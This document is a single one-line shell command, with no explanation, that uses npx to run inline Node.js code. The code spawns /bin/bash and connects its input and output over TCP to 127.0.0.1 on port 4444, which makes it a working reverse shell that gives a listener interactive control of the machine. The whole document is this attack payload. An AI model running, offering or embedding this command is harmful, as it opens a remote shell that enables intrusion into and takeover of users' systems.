```
npx -y node -e "const net=require('net'),cp=require('child_process'),sh=cp.spawn('/bin/bash',[]);const client=net.connect(4444,'127.0.0.1');sh.stdout.pipe(client);sh.stderr.pipe(client);client.pipe(sh.stdin);"
```
